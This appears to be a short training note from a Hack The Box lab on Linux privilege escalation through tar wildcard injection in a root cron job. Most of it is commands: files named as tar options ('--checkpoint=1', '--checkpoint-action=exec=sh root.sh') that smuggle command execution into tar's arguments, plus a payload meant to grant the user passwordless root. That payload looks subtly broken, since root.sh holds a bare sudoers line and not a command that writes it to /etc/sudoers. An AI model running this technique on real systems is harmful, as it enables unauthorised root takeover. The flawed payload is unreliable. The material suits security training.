#Linux_PrivilegeEscalation 

```Bash
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `tar` command has the two following options. If we use tar with the `*` wildcard as follows:

```Bash
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can exploit it by creating the following files in the `/home/htb-student` directory:

```Bash
echo "htb-student ALL=(root) NOPASSWD: ALL" > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > "--checkpoint=1"
 ```
 